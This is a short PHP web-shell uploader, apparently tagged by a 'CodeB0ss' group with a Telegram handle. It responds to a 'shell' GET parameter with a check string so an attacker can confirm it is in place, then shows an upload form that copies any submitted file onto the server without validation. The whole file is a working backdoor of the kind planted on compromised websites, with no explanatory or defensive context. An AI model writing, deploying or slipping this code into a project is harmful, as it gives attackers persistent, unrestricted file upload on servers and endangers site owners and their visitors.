<?php
if ($_GET["shell"] == "CodeB0ss"){echo "l7WA";}
echo "CodeB0ss";
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>t.me/codeb0ss<b><br><br>'; }
else { echo '<b>t.me/codeb0ss</b><br><br>'; }
}
?>
